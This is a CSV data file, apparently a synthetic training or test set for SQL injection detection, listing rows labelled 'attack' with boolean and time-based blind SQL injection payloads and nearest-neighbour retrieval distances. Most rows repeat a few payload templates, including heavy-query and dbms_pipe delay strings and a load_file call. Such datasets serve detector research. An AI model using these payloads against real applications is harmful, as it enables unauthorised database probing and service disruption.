id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
CTGAN_001140,attack,boolean,"1""   )    )     )   and make_set  (  6751  =  8128,8128  )   and    (    (     (  ""uhiy""  =  ""uhiy",nearest_attack_euclidean,R000062,6.5258777911396395
CTGAN_001141,attack,boolean,"1 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000056,8.73266640643006
CTGAN_001142,attack,boolean,"-5158'   )    )    or make_set  (  9354  =  9354,7185  )   and    (    (   'noaj' like 'noaj",nearest_attack_euclidean,R000028,6.1881622201864035
CTGAN_001143,attack,boolean,"1""   )    )     )   and make_set  (  6751  =  8128,8128  )   and    (    (     (  ""uhiy""  =  ""uhiy",nearest_attack_euclidean,R000062,6.977675532517205
CTGAN_001144,attack,boolean,"1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",nearest_attack_euclidean,R000064,7.106484565609135
CTGAN_001145,attack,boolean,"1%'   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000048,6.313436446831957
CTGAN_001146,attack,boolean," and 1  =    (   if   (    (   load_file  (  char  (  110,46,101,120,11 ...",nearest_attack_euclidean,R000004,8.184496340619939
CTGAN_001147,attack,boolean,"1 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000056,4.804701930176763
CTGAN_001148,attack,boolean,"1""   )    )     )   and   (  3020  =  3020  )  *6703 and    (    (     (  ""fqap"" like ""fqap",nearest_attack_euclidean,R000055,8.141957056695585
CTGAN_001149,attack,boolean,"1'   )    )    and make_set  (  8245  =  9872,9872  )   and    (    (   'kzgt'  =  'kzgt",nearest_attack_euclidean,R000006,6.579637006698353
CTGAN_001150,attack,boolean,"1'   )    )    and make_set  (  8245  =  9872,9872  )   and    (    (   'kzgt'  =  'kzgt",nearest_attack_euclidean,R000006,5.754231107882816
CTGAN_001151,attack,boolean,"1""   )    )    and   (  1248  =  8705  )  *8705 and    (    (   ""wvma"" like ""wvma",nearest_attack_euclidean,R000038,4.339024733382349
CTGAN_001152,attack,boolean,"1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",nearest_attack_euclidean,R000064,5.340894626186013
CTGAN_001153,attack,boolean,"1   )    )    or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   5888  =  5888",nearest_attack_euclidean,R000069,6.901663818762416
CTGAN_001154,attack,boolean,"-8673""  )   or make_set  (  9354  =  9354,7185  )   and   (  ""edap"" like ""edap",nearest_attack_euclidean,R000049,6.932983500068744
CTGAN_001155,attack,boolean,"-8425""   )    )    or   (  6485  =  1127  )  *1127 and    (    (   ""qruf""  =  ""qruf",nearest_attack_euclidean,R000039,6.387849323781541
CTGAN_001156,attack,boolean,"1'   )    )     )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000042,7.206563222802011
CTGAN_001157,attack,boolean,"1""  )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and   (  ""rkvr""  =  ""rkvr",nearest_attack_euclidean,R000023,7.1451273160431805
CTGAN_001158,attack,boolean,1%' rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and '%'  =  ',nearest_attack_euclidean,R000029,4.903818340932089
CTGAN_001159,attack,boolean,"1""  )   where 7471  =  7471 and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000046,5.770001672672664
CTGAN_001160,attack,boolean,"1%"" and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000025,7.11824829925882
CTGAN_001161,attack,boolean,"1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",nearest_attack_euclidean,R000064,5.001814218165115
CTGAN_001162,attack,boolean,"1""  )   or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  ""rzja"" like ""rzja",nearest_attack_euclidean,R000047,5.8320835001197295
CTGAN_001163,attack,boolean,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and ""%""  =  """,nearest_attack_euclidean,R000051,7.1678343676551535
CTGAN_001164,attack,boolean,"1'   )    )    and make_set  (  8245  =  9872,9872  )   and    (    (   'kzgt'  =  'kzgt",nearest_attack_euclidean,R000006,10.174125199437364
CTGAN_001165,attack,boolean,"1'||  (  select 'xpjg' where 3036  =  3036 and elt  (  1832  =  6644,6644   )    )   ||'",nearest_attack_euclidean,R000030,8.105488831062269
CTGAN_001166,attack,boolean,"1""  )   where 7471  =  7471 and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000046,7.750028997545863
CTGAN_001167,attack,boolean,"1 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000056,5.900343198721034
CTGAN_001168,attack,boolean,"1   )    )    or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   5888  =  5888",nearest_attack_euclidean,R000069,7.889390045282368
CTGAN_001169,attack,boolean,"1'||  (  select 'xpjg' where 3036  =  3036 and elt  (  1832  =  6644,6644   )    )   ||'",nearest_attack_euclidean,R000030,6.925711181264522
CTGAN_001170,attack,boolean,"1'  )   as uqkz where 8482  =  8482 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000032,7.523773887297894
CTGAN_001171,attack,boolean,"1%""  )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000011,6.524400023771018
CTGAN_001172,attack,boolean,"1""  )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and   (  ""rkvr""  =  ""rkvr",nearest_attack_euclidean,R000023,6.9872683607371
CTGAN_001173,attack,boolean,"1%'   )    )     )   and make_set  (  8403  =  8403,8899  )   and    (    (     (  '%'  =  '",nearest_attack_euclidean,R000065,6.157178618475971
CTGAN_001174,attack,boolean,"-5158'   )    )    or make_set  (  9354  =  9354,7185  )   and    (    (   'noaj' like 'noaj",nearest_attack_euclidean,R000028,6.5206743564366425
CTGAN_001175,attack,boolean,"1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",nearest_attack_euclidean,R000064,6.812857638862854
CTGAN_001176,attack,boolean,"1  )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  7182  =  7182",nearest_attack_euclidean,R000072,8.03996457908515
CTGAN_001177,attack,boolean,"1%'   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000048,6.2412274072592915
CTGAN_001178,attack,boolean,"1%'   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000048,7.358895833782416
CTGAN_001179,attack,boolean,"-5158'   )    )    or make_set  (  9354  =  9354,7185  )   and    (    (   'noaj' like 'noaj",nearest_attack_euclidean,R000028,6.807941756981029
CTGAN_001180,attack,boolean,1'   )    )    rlike   (  select   (  case when   (  6205  =  1384  )   then 1 else 0x28 end   )    )    and    (    (   'ahjf'  =  'ahjf,nearest_attack_euclidean,R000078,6.682416154453223
CTGAN_001181,attack,boolean,"1""   )    )    as gawq where 4728  =  4728 or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000017,7.725081318094024
CTGAN_001182,attack,boolean,"1  )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  7182  =  7182",nearest_attack_euclidean,R000072,8.225548102103554
CTGAN_001183,attack,boolean,1'+  (  select lqhd where 4251  =  4251 and   (  8754  =  5779  )  *5779  )  +',nearest_attack_euclidean,R000040,10.032331903825623
CTGAN_001184,attack,boolean,"1""   )    )     )   and make_set  (  6751  =  8128,8128  )   and    (    (     (  ""uhiy""  =  ""uhiy",nearest_attack_euclidean,R000062,8.053142275146781
CTGAN_001185,attack,boolean,"1   )    )    or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   5888  =  5888",nearest_attack_euclidean,R000069,6.361733169221364
CTGAN_001186,attack,boolean,"1%'   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000048,5.661393529888739
CTGAN_001187,attack,boolean,"1'  )   or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and   (  'vxqs'  =  'vxqs",nearest_attack_euclidean,R000013,9.762026469076902
CTGAN_001188,attack,boolean,1%' rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and '%'  =  ',nearest_attack_euclidean,R000029,6.208287823760842
CTGAN_001189,attack,boolean,"1'   )    )    and make_set  (  8245  =  9872,9872  )   and    (    (   'kzgt'  =  'kzgt",nearest_attack_euclidean,R000006,6.8705943159640395
CTGAN_001190,attack,boolean,"1  )   where 9687  =  9687 and elt  (  9607  =  9432,9432  )  --",nearest_attack_euclidean,R000063,6.236347675232594
CTGAN_001191,attack,boolean,"1'  )   where 4297  =  4297 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000041,7.662558499030296
CTGAN_001192,attack,boolean,"1   )    )    or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   5888  =  5888",nearest_attack_euclidean,R000069,6.8056597675944115
CTGAN_001193,attack,boolean,"1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",nearest_attack_euclidean,R000064,6.895519150598947
CTGAN_001194,attack,boolean,"1""   )    )    and   (  1248  =  8705  )  *8705 and    (    (   ""wvma"" like ""wvma",nearest_attack_euclidean,R000038,6.6405592812180325
CTGAN_001195,attack,boolean,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and 'qjle'  =  'qjle",nearest_attack_euclidean,R000068,6.599878388385538
CTGAN_001196,attack,boolean,"1'||  (  select 'xpjg' where 3036  =  3036 and elt  (  1832  =  6644,6644   )    )   ||'",nearest_attack_euclidean,R000030,6.819180232800097
CTGAN_001197,attack,boolean,1'   )    )    rlike   (  select   (  case when   (  6205  =  1384  )   then 1 else 0x28 end   )    )    and    (    (   'ahjf'  =  'ahjf,nearest_attack_euclidean,R000078,7.669349331409916
CTGAN_001198,attack,boolean,"1""   )    )     )   and make_set  (  6751  =  8128,8128  )   and    (    (     (  ""uhiy""  =  ""uhiy",nearest_attack_euclidean,R000062,4.853407759780903
CTGAN_001199,attack,boolean,1'+  (  select lqhd where 4251  =  4251 and   (  8754  =  5779  )  *5779  )  +',nearest_attack_euclidean,R000040,8.442473125402877
CTGAN_001200,attack,boolean,"1'   )    )     )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000042,6.541382913735483
CTGAN_001201,attack,boolean,"1%'   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000048,7.020461158056532
CTGAN_001202,attack,boolean,"-1422%""  )   or make_set  (  9539  =  9519,9519  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000053,6.789530619578175
CTGAN_001203,attack,boolean," and 1  =    (   if   (    (   load_file  (  char  (  110,46,101,120,11 ...",nearest_attack_euclidean,R000004,8.64903776921685
CTGAN_001204,attack,boolean,"1'   )    )    and make_set  (  8245  =  9872,9872  )   and    (    (   'kzgt'  =  'kzgt",nearest_attack_euclidean,R000006,6.193294257082533
CTGAN_001205,attack,boolean,"1'   )    )     )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000042,8.449787840559978
CTGAN_001206,attack,boolean,1'  )   rlike   (  select   (  case when   (  2671  =  4485  )   then 1 else 0x28 end   )    )    and   (  'ezco' like 'ezco,nearest_attack_euclidean,R000074,7.1044819752271025
CTGAN_001207,attack,boolean,"1  )   where 9687  =  9687 and elt  (  9607  =  9432,9432  )  --",nearest_attack_euclidean,R000063,8.178854570695833
CTGAN_001208,attack,boolean,"1  )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and   (  5098  =  5098",nearest_attack_euclidean,R000012,7.774283966500964
CTGAN_001209,attack,boolean,"1""   )    )     )   and make_set  (  6751  =  8128,8128  )   and    (    (     (  ""uhiy""  =  ""uhiy",nearest_attack_euclidean,R000062,7.142235967759627
CTGAN_001210,attack,boolean,1'+  (  select lqhd where 4251  =  4251 and   (  8754  =  5779  )  *5779  )  +',nearest_attack_euclidean,R000040,6.943731122801
CTGAN_001211,attack,boolean,1'  )   rlike   (  select   (  case when   (  2671  =  4485  )   then 1 else 0x28 end   )    )    and   (  'ezco' like 'ezco,nearest_attack_euclidean,R000074,6.673731218977878
CTGAN_001212,attack,boolean,"1  )   where 9687  =  9687 and elt  (  9607  =  9432,9432  )  --",nearest_attack_euclidean,R000063,6.552903502957821
CTGAN_001213,attack,boolean,"-6561""   )    )     )   or 6872  =  6872 and    (    (     (  ""azqp"" like ""azqp",nearest_attack_euclidean,R000010,6.419305566731396
CTGAN_001214,attack,boolean,"1%"" and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000025,6.359957250658934
CTGAN_001215,attack,boolean,1'  )   rlike   (  select   (  case when   (  2671  =  4485  )   then 1 else 0x28 end   )    )    and   (  'ezco' like 'ezco,nearest_attack_euclidean,R000074,6.709257285822982
CTGAN_001216,attack,boolean,"1  )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and   (  5098  =  5098",nearest_attack_euclidean,R000012,7.624408589496218
CTGAN_001217,attack,boolean,"1""  )   as klur where 7046  =  7046 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000021,5.747763007774825
CTGAN_001218,attack,boolean,"1%'   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000048,9.848656969609912
CTGAN_001219,attack,boolean,"1%"" and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000025,7.072857360449797
CTGAN_001220,attack,boolean,"-5158'   )    )    or make_set  (  9354  =  9354,7185  )   and    (    (   'noaj' like 'noaj",nearest_attack_euclidean,R000028,7.134973568521953
CTGAN_001221,attack,boolean,"1  )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  7182  =  7182",nearest_attack_euclidean,R000072,8.750369581949917
CTGAN_001222,attack,boolean," and 1  =    (   if   (    (   load_file  (  char  (  110,46,101,120,11 ...",nearest_attack_euclidean,R000004,6.714410856809538
CTGAN_001223,attack,boolean,"1""  )   or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  ""rzja"" like ""rzja",nearest_attack_euclidean,R000047,6.943292642406954
CTGAN_001224,attack,boolean,"-5158'   )    )    or make_set  (  9354  =  9354,7185  )   and    (    (   'noaj' like 'noaj",nearest_attack_euclidean,R000028,8.769852670380041
CTGAN_001225,attack,boolean,1%' rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and '%'  =  ',nearest_attack_euclidean,R000029,7.394710227382409
CTGAN_001226,attack,boolean,"1""   )    )     )   and make_set  (  6751  =  8128,8128  )   and    (    (     (  ""uhiy""  =  ""uhiy",nearest_attack_euclidean,R000062,6.7063988836590145
CTGAN_001227,attack,boolean,"1""  )   or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  ""rzja"" like ""rzja",nearest_attack_euclidean,R000047,8.025856537631007
CTGAN_001228,attack,boolean,"-6561""   )    )     )   or 6872  =  6872 and    (    (     (  ""azqp"" like ""azqp",nearest_attack_euclidean,R000010,8.742499708553535
CTGAN_001229,attack,boolean,"-6846%""   )    )    or   (  8459  =  8459  )  *4906 and    (    (   ""%""  =  """,nearest_attack_euclidean,R000009,5.861422657248555
CTGAN_001230,attack,boolean,"1'+  (  select 'wkbg' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'",nearest_attack_euclidean,R000073,9.053507802779182
CTGAN_001231,attack,boolean,"1%"" and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000025,6.890685785349186
CTGAN_001232,attack,boolean,"1'   )    )    and make_set  (  8245  =  9872,9872  )   and    (    (   'kzgt'  =  'kzgt",nearest_attack_euclidean,R000006,8.10626072821652
CTGAN_001233,attack,boolean,"-5158'   )    )    or make_set  (  9354  =  9354,7185  )   and    (    (   'noaj' like 'noaj",nearest_attack_euclidean,R000028,7.167866158596639
CTGAN_001234,attack,boolean,"1""   )    )     )   and make_set  (  6751  =  8128,8128  )   and    (    (     (  ""uhiy""  =  ""uhiy",nearest_attack_euclidean,R000062,8.76914139769266
CTGAN_001235,attack,boolean," and 1  =    (   if   (    (   load_file  (  char  (  110,46,101,120,11 ...",nearest_attack_euclidean,R000004,7.070337906592708
CTGAN_001236,attack,boolean,1'+  (  select lqhd where 4251  =  4251 and   (  8754  =  5779  )  *5779  )  +',nearest_attack_euclidean,R000040,7.505585635995772
CTGAN_001237,attack,boolean,"-5158'   )    )    or make_set  (  9354  =  9354,7185  )   and    (    (   'noaj' like 'noaj",nearest_attack_euclidean,R000028,6.673773494150176
CTGAN_001238,attack,boolean,"1 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000056,6.228019673208416
CTGAN_001239,attack,boolean,"1   )    )    or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   5888  =  5888",nearest_attack_euclidean,R000069,6.587980822922185
CTGAN_001240,attack,boolean,"1""  )   or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  ""rzja"" like ""rzja",nearest_attack_euclidean,R000047,8.620640267256148
CTGAN_001241,attack,boolean,"1""  )   where 7471  =  7471 and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000046,7.167678455654594
CTGAN_001242,attack,boolean,"1%""  )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000011,7.432189046030579
CTGAN_001243,attack,boolean,1'+  (  select lqhd where 4251  =  4251 and   (  8754  =  5779  )  *5779  )  +',nearest_attack_euclidean,R000040,7.13584178816171
CTGAN_001244,attack,boolean,"1'   )    )     )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000042,6.039212981014463
CTGAN_001245,attack,boolean,"1""  )   or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  ""rzja"" like ""rzja",nearest_attack_euclidean,R000047,5.653487233190729
CTGAN_001246,attack,boolean,-5067'   )    )    or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   'vkab' like 'vkab,nearest_attack_euclidean,R000070,7.4375429815370335
CTGAN_001247,attack,boolean,"1'   )    )     )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000042,6.541916693390841
CTGAN_001248,attack,boolean,"-1422%""  )   or make_set  (  9539  =  9519,9519  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000053,7.820690954061703
CTGAN_001249,attack,boolean,"-1422%""  )   or make_set  (  9539  =  9519,9519  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000053,7.46423567175995
CTGAN_001250,attack,boolean,"1 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000056,5.859484900221844
CTGAN_001251,attack,boolean," and 1  =    (   if   (    (   load_file  (  char  (  110,46,101,120,11 ...",nearest_attack_euclidean,R000004,6.725042172362326
CTGAN_001252,attack,boolean,"1""   )    )     )   and make_set  (  6751  =  8128,8128  )   and    (    (     (  ""uhiy""  =  ""uhiy",nearest_attack_euclidean,R000062,4.874275520001945
CTGAN_001253,attack,boolean,"1""   )    )     )   and make_set  (  6751  =  8128,8128  )   and    (    (     (  ""uhiy""  =  ""uhiy",nearest_attack_euclidean,R000062,8.061409853065976
CTGAN_001254,attack,boolean,"-5158'   )    )    or make_set  (  9354  =  9354,7185  )   and    (    (   'noaj' like 'noaj",nearest_attack_euclidean,R000028,8.937193418681836
CTGAN_001255,attack,boolean,"-8673""  )   or make_set  (  9354  =  9354,7185  )   and   (  ""edap"" like ""edap",nearest_attack_euclidean,R000049,7.200066025200802
CTGAN_001256,attack,boolean,"1""   )    )    and   (  1248  =  8705  )  *8705 and    (    (   ""wvma"" like ""wvma",nearest_attack_euclidean,R000038,7.287237132368608
CTGAN_001257,attack,boolean,"-8673""  )   or make_set  (  9354  =  9354,7185  )   and   (  ""edap"" like ""edap",nearest_attack_euclidean,R000049,6.313240564237735
CTGAN_001258,attack,boolean,"1'  )   as uqkz where 8482  =  8482 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000032,6.6142650961805645
CTGAN_001259,attack,boolean,"-8425""   )    )    or   (  6485  =  1127  )  *1127 and    (    (   ""qruf""  =  ""qruf",nearest_attack_euclidean,R000039,5.83045143460485
CTGAN_001260,attack,boolean,"1""   )    )     )   and make_set  (  6751  =  8128,8128  )   and    (    (     (  ""uhiy""  =  ""uhiy",nearest_attack_euclidean,R000062,7.116010679698361
CTGAN_001261,attack,boolean,"1""   )    )     )   and   (  3020  =  3020  )  *6703 and    (    (     (  ""fqap"" like ""fqap",nearest_attack_euclidean,R000055,5.43329022438014
CTGAN_001262,attack,boolean,"1'+  (  select 'wkbg' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'",nearest_attack_euclidean,R000073,7.761365274848372
CTGAN_001263,attack,boolean,"1'||  (  select 'xpjg' where 3036  =  3036 and elt  (  1832  =  6644,6644   )    )   ||'",nearest_attack_euclidean,R000030,8.817102720248194
CTGAN_001264,attack,boolean,"1 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  -- dpph",nearest_attack_euclidean,R000014,6.20149785775288
CTGAN_001265,attack,boolean,"1'||  (  select 'ersu' where 4123  =  4123 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R000008,8.472040322868853
CTGAN_001266,attack,boolean,"-5158'   )    )    or make_set  (  9354  =  9354,7185  )   and    (    (   'noaj' like 'noaj",nearest_attack_euclidean,R000028,8.084072085314999
CTGAN_001267,attack,boolean,"1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",nearest_attack_euclidean,R000064,5.793753758284086
CTGAN_001268,attack,boolean,"1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",nearest_attack_euclidean,R000064,5.805542132819551
CTGAN_001269,attack,boolean,"1'   )    )    and make_set  (  8245  =  9872,9872  )   and    (    (   'kzgt'  =  'kzgt",nearest_attack_euclidean,R000006,5.9242166191606564
CTGAN_001270,attack,boolean,"1   )    )    or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   5888  =  5888",nearest_attack_euclidean,R000069,6.072087393987172
CTGAN_001271,attack,boolean,"1 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  -- dpph",nearest_attack_euclidean,R000014,6.517240268253736
CTGAN_001272,attack,boolean,"1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",nearest_attack_euclidean,R000064,6.24516662720347
CTGAN_001273,attack,boolean,"1""   )    )     )   and   (  3020  =  3020  )  *6703 and    (    (     (  ""fqap"" like ""fqap",nearest_attack_euclidean,R000055,7.534402163454451
CTGAN_001274,attack,boolean,"1'||  (  select 'xpjg' where 3036  =  3036 and elt  (  1832  =  6644,6644   )    )   ||'",nearest_attack_euclidean,R000030,6.732266582634524
CTGAN_001275,attack,boolean,1%' rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and '%'  =  ',nearest_attack_euclidean,R000029,6.673497149484606
CTGAN_001276,attack,boolean,"1   )    )    or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   5888  =  5888",nearest_attack_euclidean,R000069,5.882238676784415
CTGAN_001277,attack,boolean,"1  )   where 5333  =  5333 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000076,7.03582819953944
CTGAN_001278,attack,boolean,"1  )   as wxms where 7272  =  7272 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000024,6.807514552512403
CTGAN_001279,attack,boolean,"1 where 3902  =  3902 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000007,6.412338640561446
CTGAN_001280,attack,boolean,"1'   )    )    and make_set  (  8245  =  9872,9872  )   and    (    (   'kzgt'  =  'kzgt",nearest_attack_euclidean,R000006,4.668656684231313
CTGAN_001281,attack,boolean,"1'+  (  select 'wkbg' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'",nearest_attack_euclidean,R000073,9.150302171421796
CTGAN_001282,attack,boolean,"1'  )   as uqkz where 8482  =  8482 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000032,5.188648845679306
CTGAN_001283,attack,boolean,"1'||  (  select 'xpjg' where 3036  =  3036 and elt  (  1832  =  6644,6644   )    )   ||'",nearest_attack_euclidean,R000030,8.393412529916736
CTGAN_001284,attack,boolean,"1'   )    )    and make_set  (  8245  =  9872,9872  )   and    (    (   'kzgt'  =  'kzgt",nearest_attack_euclidean,R000006,5.999403865225665
CTGAN_001285,attack,boolean,"1""  )   as klur where 7046  =  7046 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000021,6.839271259336281
